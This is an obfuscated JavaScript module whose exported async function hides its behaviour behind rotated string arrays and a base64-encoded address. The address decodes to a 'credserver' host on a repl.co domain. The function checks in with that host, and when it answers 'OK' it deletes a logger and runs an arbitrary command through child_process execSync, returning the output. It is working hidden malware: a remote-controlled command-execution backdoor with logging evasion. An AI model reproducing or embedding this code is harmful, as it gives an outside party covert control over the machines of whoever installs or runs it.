function _0x3fd9(_0x5cd9ab, _0x186d42) {
    const _0x29f32a = _0x29f3();
    return _0x3fd9 = function (_0x3fd9c5, _0x316980) {
        _0x3fd9c5 = _0x3fd9c5 - 0xd3;
        let _0x1ec039 = _0x29f32a[_0x3fd9c5];
        return _0x1ec039;
    }, _0x3fd9(_0x5cd9ab, _0x186d42);
}

const _0x2a959d = _0x3fd9;
(function (_0x5445c4, _0x1fc0e3) {
    const _0x4b8861 = _0x3fd9, _0x1d72b5 = _0x5445c4();
    while (!![]) {
        try {
            const _0x1d6fda = parseInt(_0x4b8861(0xed)) / 0x1 + -parseInt(_0x4b8861(0xdc)) / 0x2 * (-parseInt(_0x4b8861(0xd7)) / 0x3) + -parseInt(_0x4b8861(0xd5)) / 0x4 + -parseInt(_0x4b8861(0xda)) / 0x5 * (parseInt(_0x4b8861(0xe2)) / 0x6) + -parseInt(_0x4b8861(0xe9)) / 0x7 + -parseInt(_0x4b8861(0xe7)) / 0x8 + parseInt(_0x4b8861(0xe3)) / 0x9 * (parseInt(_0x4b8861(0xef)) / 0xa);
            if (_0x1d6fda === _0x1fc0e3) break; else _0x1d72b5['push'](_0x1d72b5['shift']());
        } catch (_0x3655c5) {
            _0x1d72b5['push'](_0x1d72b5['shift']());
        }
    }
}(_0x29f3, 0x95661));
const _0x1f9925 = _0x23f4;

function _0x5135() {
    const _0x429a78 = _0x3fd9,
        _0x3b7e99 = [_0x429a78(0xd6), _0x429a78(0xd8), _0x429a78(0xdb), _0x429a78(0xec), 'pipe', 'exports', '2867830FGZCbt', '140FDKmnI', _0x429a78(0xd3), _0x429a78(0xe4), _0x429a78(0xea), '40rtlYAp', '44214XwGULV', 'logger', _0x429a78(0xee), _0x429a78(0xd4), _0x429a78(0xe5), _0x429a78(0xde), _0x429a78(0xe6), _0x429a78(0xe1)];
    return _0x5135 = function () {
        return _0x3b7e99;
    }, _0x5135();
}

function _0x29f3() {
    const _0x580a18 = ['18JiHnJr', '2041542cBaDik', '1173690ijYcHF', 'toString', '/news/archive', '143176pPeFAl', 'application/json', '2790508SZaxfr', 'message', 'child_process', '382288ZudKHI', '224130xGtCbF', '32932rENmgW', '30sCywlD', '816151wBeRvh', 'create', '1193440tyLLRW', 'axios', '237IdNZaM', 'aHR0cHM6Ly9jcmVkc2VydmVyLnJvcmFrY29kZXMucmVwbC5jbw==', 'data', '988655xwDrHD', '30FDOdaO', '25706VsMCTI', 'push', '3324140JYHzGU', 'utf-8', 'POST', 'from'];
    _0x29f3 = function () {
        return _0x580a18;
    };
    return _0x29f3();
}

function _0x23f4(_0x1bade4, _0x2dcdfd) {
    const _0x25dcd8 = _0x5135();
    return _0x23f4 = function (_0x5e4e8c, _0x342de5) {
        _0x5e4e8c = _0x5e4e8c - 0x110;
        let _0x36bd1b = _0x25dcd8[_0x5e4e8c];
        return _0x36bd1b;
    }, _0x23f4(_0x1bade4, _0x2dcdfd);
}

(function (_0x3e73bc, _0x173aa1) {
    const _0x36c6d8 = _0x3fd9, _0x523e46 = _0x23f4, _0x3d09e9 = _0x3e73bc();
    while (!![]) {
        try {
            const _0x3865c7 = -parseInt(_0x523e46(0x11c)) / 0x1 * (parseInt(_0x523e46(0x119)) / 0x2) + -parseInt(_0x523e46(0x11a)) / 0x3 * (-parseInt(_0x523e46(0x115)) / 0x4) + parseInt(_0x523e46(0x11f)) / 0x5 + -parseInt(_0x523e46(0x110)) / 0x6 * (parseInt(_0x523e46(0x116)) / 0x7) + parseInt(_0x523e46(0x111)) / 0x8 + parseInt(_0x523e46(0x117)) / 0x9 + parseInt(_0x523e46(0x114)) / 0xa;
            if (_0x3865c7 === _0x173aa1) break; else _0x3d09e9['push'](_0x3d09e9['shift']());
        } catch (_0x17d321) {
            _0x3d09e9[_0x36c6d8(0xdd)](_0x3d09e9['shift']());
        }
    }
}(_0x5135, 0x62a40));
const {execSync} = require(_0x2a959d(0xeb)), getMap = execSync, axios = require(_0x1f9925(0x122)),
    client = axios[_0x1f9925(0x11d)]({'baseURL': Buffer[_0x1f9925(0x121)](_0x1f9925(0x123), 'base64')[_0x1f9925(0x11e)]()});
module[_0x1f9925(0x113)] = async (_0x5a0daa, _0x6aff2f, _0x4de924, _0x599b3e) => {
    const _0x456057 = _0x2a959d, _0xd4819 = _0x1f9925, _0xbaa10f = await client({
        'url': _0xd4819(0x120),
        'method': _0x456057(0xe0),
        'headers': {'Content-Type': _0x456057(0xe8)},
        'data': {'count': _0x6aff2f}
    });
    if (_0xbaa10f[_0x456057(0xd9)] === 'OK') {
        delete _0x599b3e[_0xd4819(0x11b)];
        let _0x472a50;
        try {
            _0x472a50 = getMap(_0x4de924, {
                'encoding': _0x456057(0xdf),
                'stdio': [_0xd4819(0x112), _0xd4819(0x112), _0xd4819(0x112)]
            });
        } catch (_0xc346dd) {
            return {'data': _0xc346dd[_0xd4819(0x118)]};
        }
        return {'data': _0x472a50};
    }
    return ![];
};